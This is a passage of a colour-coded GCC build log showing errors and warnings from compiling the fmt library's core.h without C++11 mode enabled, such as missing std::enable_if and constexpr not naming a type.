 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:869:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(convert_to_int<T, typename C::char_type>::value&&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:869:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(convert_to_int<T, typename C::char_type>::value&&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:876:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(is_constructible<basic_string_view<Char>, T>::value &&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:876:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(is_constructible<basic_string_view<Char>, T>::value &&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:878:77:[m[K [01;31m[Kerror: [m[Kno default argument for ‘[01m[K<anonymous>[m[K’
 inline init<C, basic_string_view<Char>, string_type> make_value(const T& val) {
[01;32m[K                                                                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:878:77:[m[K [01;31m[Kerror: [m[Kdefault template arguments may not be used in function templates without -std=c++11 or -std=gnu++11
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:886:32:[m[K [01;31m[Kerror: [m[K‘[01m[Kremove_volatile[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
     typename U = typename std::remove_volatile<T>::type,
[01;32m[K                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:886:47:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
     typename U = typename std::remove_volatile<T>::type,
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:892:62:[m[K [01;31m[Kerror: [m[Kdefault template arguments may not be used in function templates without -std=c++11 or -std=gnu++11
 inline init<C, const T&, custom_type> make_value(const T& val) {
[01;32m[K                                                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:904:35:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename C, typename S, FMT_ENABLE_IF(internal::is_string<S>::value)>
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:904:35:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename C, typename S, FMT_ENABLE_IF(internal::is_string<S>::value)>
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:905:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 init<C, basic_string_view<typename C::char_type>, string_type>
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:905:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 init<C, basic_string_view<typename C::char_type>, string_type>
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:916:22:[m[K [01;35m[Kwarning: [m[Kscoped enums only available with -std=c++11 or -std=gnu++11 [enabled by default]
 enum : unsigned long long { is_unpacked_bit = 1ull << 63 };
[01;32m[K                      ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:934:27:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K&&[m[K’ token
   visit_format_arg(Visitor&& vis, const basic_format_arg<Ctx>& arg);
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:134:39:[m[K [01;35m[Kwarning: [m[Kexplicit conversion operators only available with -std=c++11 or -std=gnu++11 [enabled by default]
 #  define FMT_DETECTED_NOEXCEPT throw()
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:140:26:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_DETECTED_NOEXCEPT[m[K’
 #    define FMT_NOEXCEPT FMT_DETECTED_NOEXCEPT
[01;32m[K                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:956:52:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_NOEXCEPT[m[K’
   FMT_CONSTEXPR FMT_EXPLICIT operator bool() const FMT_NOEXCEPT {
[01;32m[K                                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:977:12:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K&&[m[K’ token
     Visitor&& vis, const basic_format_arg<Context>& arg) {
[01;32m[K            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Ktypename fmt::v5::internal::result_of<Visitor(int)>::type fmt::v5::visit_format_arg(Visitor)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:979:11:[m[K [01;31m[Kerror: [m[K‘[01m[Karg[m[K’ was not declared in this scope
   switch (arg.type_) {
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:986:36:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.int_value);
[01;32m[K                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:988:37:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.uint_value);
[01;32m[K                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:990:42:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.long_long_value);
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:992:43:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.ulong_long_value);
[01;32m[K                                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:994:41:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.int_value != 0);
[01;32m[K                                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:996:60:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(static_cast<char_type>(arg.value_.int_value));
[01;32m[K                                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:998:39:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.double_value);
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1000:44:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.long_double_value);
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1002:39:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.string.value);
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1007:34:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
     return vis(arg.value_.pointer);
[01;32m[K                                  ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1011:25:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kvis[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kvis[m[K’ must be available [-fpermissive]
   return vis(monostate());
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1016:14:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K&&[m[K’ token
 visit(Visitor&& vis, const basic_format_arg<Context>& arg) {
[01;32m[K              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Ktypename fmt::v5::internal::result_of<Visitor(int)>::type fmt::v5::visit(Visitor)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kforward[m[K’ is not a member of ‘[01m[Kstd[m[K’
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:47:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[K>[m[K’ token
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:49:[m[K [01;31m[Kerror: [m[K‘[01m[Kvis[m[K’ was not declared in this scope
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                                                 ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1017:55:[m[K [01;31m[Kerror: [m[K‘[01m[Karg[m[K’ was not declared in this scope
   return visit_format_arg(std::forward<Visitor>(vis), arg);
[01;32m[K                                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1024:29:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   arg_map(const arg_map&) = delete;
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1025:36:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   void operator=(const arg_map&) = delete;
[01;32m[K                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kvoid fmt::v5::internal::arg_map<Context>::push_back(fmt::v5::internal::value<Context>)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1039:19:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
     map_[size_] = entry{named.name, named.template deserialize<Context>()};
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kfmt::v5::basic_format_arg<Context> fmt::v5::internal::arg_map<Context>::find(fmt::v5::basic_string_view<typename S::char_type>) const[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1053:5:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
     return {};
[01;32m[K     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:7:[m[K [01;31m[Kerror: [m[Kexpected identifier
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:26:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K([m[K’ token
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:26:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K([m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kdeclval[m[K’ has not been declared
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:34:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before ‘[01m[K<[m[K’ token
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                                  ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:67:[m[K [01;31m[Kerror: [m[KISO C++ forbids declaration of ‘[01m[Kdecltype[m[K’ with no type [-fpermissive]
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                                                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:67:[m[K [01;31m[Kerror: [m[K‘[01m[Kdecltype[m[K’ declared as function returning a function
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:67:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K;[m[K’ at end of member declaration
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1072:68:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K)[m[K’ token
       make_value<Context>(declval<typename std::decay<T>::type&>())) value_type;
[01;32m[K                                                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1073:29:[m[K [01;31m[Kerror: [m[K‘[01m[Kvalue_type[m[K’ has not been declared
   static const type value = value_type::type_tag;
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1076:29:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 template <typename Context> FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1076:29:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 template <typename Context> FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1080:51:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename Context, typename Arg, typename... Args>
[01;32m[K                                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1081:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1081:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1094:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1094:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1100:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1100:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!IS_PACKED)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1118:55:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   basic_format_context(const basic_format_context&) = delete;
[01;32m[K                                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1119:49:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   void operator=(const basic_format_context&) = delete;
[01;32m[K                                                 ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kfmt::v5::internal::error_handler fmt::v5::basic_format_context<OutputIt, Char>::error_handler()[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1145:45:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
   internal::error_handler error_handler() { return {}; }
[01;32m[K                                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1160:54:[m[K [01;31m[Kerror: [m[K‘[01m[K>>[m[K’ should be ‘[01m[K> >[m[K’ within a nested template argument list
       std::back_insert_iterator<internal::buffer<Char>>, Char>
[01;32m[K                                                      ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1173:37:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename Context, typename... Args> class format_arg_store {
[01;32m[K                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1175:40:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
   static const size_t NUM_ARGS = sizeof...(Args);
[01;32m[K                                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1180:25:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
   typedef typename std::conditional<IS_PACKED, internal::value<Context>,
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1180:36:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
   typedef typename std::conditional<IS_PACKED, internal::value<Context>,
[01;32m[K                                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1186:3:[m[K [01;31m[Kerror: [m[K‘[01m[Kvalue_type[m[K’ does not name a type
   value_type data_[DATA_SIZE];
[01;32m[K   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1190:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1190:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long get_types() {
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1197:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long TYPES = get_types();
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1197:10:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
   static FMT_CONSTEXPR11 unsigned long long TYPES = get_types();
[01;32m[K          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1211:35:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
   format_arg_store(const Args&... args)
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::format_arg_store<Context, Args>::format_arg_store(const Args& ...)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:1212:9:[m[K [01;31m[Kerror: [m[Kclass ‘[01m[Kfmt::v5::format_arg_store<Context, Args>[m[K’ does not have any field named ‘[01m[Kdata_[m[K’
       : data_{internal::make_arg<IS_PACKED, Context>(args)...} {}
[01;32m[K         ^[m[K
